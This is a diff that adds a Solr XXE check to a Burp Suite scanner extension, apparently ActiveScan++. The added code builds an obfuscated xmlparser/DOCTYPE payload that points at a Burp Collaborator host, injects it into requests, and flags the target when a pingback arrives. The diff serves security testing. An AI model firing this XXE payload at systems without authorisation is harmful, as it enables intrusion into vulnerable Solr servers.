@@ -53,6 +53,7 @@ class BurpExtender(IBurpExtender):
             callbacks.registerScannerCheck(SuspectTransform())
             callbacks.registerScannerCheck(JetLeak())
             callbacks.registerScannerCheck(SimpleFuzz())
+            callbacks.registerScannerCheck(Solr())
 
         print "Successfully loaded activeScan++ v" + VERSION
 
@@ -373,6 +374,23 @@ class SuspectTransform(IScannerCheck):
 
     def consolidateDuplicateIssues(self, existingIssue, newIssue):
         return is_same_issue(existingIssue, newIssue)
+
+
+class Solr(IScannerCheck):
+    def doActiveScan(self, basePair, insertionPoint):
+        collab = callbacks.createBurpCollaboratorClientContext()
+        obfuscated_payload = "{!xmlparser v='<!DOCTYPE a SYSTEM \"http://"+collab.generatePayload(True).replace(".", "&#x2e;")+"/\"'><a></a>'}"
+        attack = request(basePair, insertionPoint, obfuscated_payload)
+        interactions = collab.fetchAllCollaboratorInteractions()
+        if interactions:
+            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
+                                    'Solr XXE',
+                                    "The application appears to be running a version of Solr vulnerable to XXE. ActiveScan++ sent a reference to an external file, and received a pingback from the server.<br/><br/>"+
+                                    "To investigate, use the manual collaborator client. Please refer to https://mail-archives.apache.org/mod_mbox/lucene-dev/201710.mbox/%3CCAJEmKoC%2BeQdP-E6BKBVDaR_43fRs1A-hOLO3JYuemmUcr1R%2BTA%40mail.gmail.com%3E for further information",
+                                    'Firm', 'High')]
+
+        return []
+
 
 
 # Detect CVE-2015-2080
